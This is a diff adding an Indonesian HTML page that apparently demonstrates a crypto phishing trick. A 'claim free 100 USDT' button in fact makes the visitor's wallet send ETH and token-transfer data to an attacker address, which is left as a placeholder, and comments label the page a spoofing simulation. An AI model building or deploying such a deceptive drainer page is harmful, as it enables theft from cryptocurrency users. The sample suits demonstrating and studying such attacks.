@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <title>Uji Coba UI/UX Mismatch</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.0/ethers.umd.min.js"></script>
+    <style>
+        .spoof-box { border: 2px solid red; padding: 20px; text-align: center; }
+    </style>
+</head>
+<body>
+    <div class="spoof-box">
+        <h1>Event Spesial: Klaim Hadiah!</h1>
+        <p>Klik tombol di bawah untuk mendapatkan 100 USDT secara gratis.</p>
+        <button id="claimBtn">Klaim Hadiah Sekarang</button>
+    </div>
+
+    <script>
+        const provider = new ethers.BrowserProvider(window.ethereum);
+        
+        document.getElementById('claimBtn').addEventListener('click', async () => {
+            const signer = await provider.getSigner();
+            
+            // SIMULASI SPOOFING:
+            // UI menampilkan "Klaim Hadiah", tapi payload transaksi 
+            // sebenarnya adalah transfer dana ke penyerang.
+            try {
+                const tx = await signer.sendTransaction({
+                    to: "0xABC123...[Alamat Penyerang]", 
+                    value: ethers.parseEther("0.1"), // Mengirim dana, bukan menerima
+                    data: "0xa9059cbb..." // Contoh data untuk transfer token ERC-20
+                });
+                alert("Transaksi dikirim: " + tx.hash);
+            } catch (err) {
+                console.log("Pengguna membatalkan transaksi atau terjadi kesalahan.");
+            }
+        });
+    </script>
+</body>
+</html>
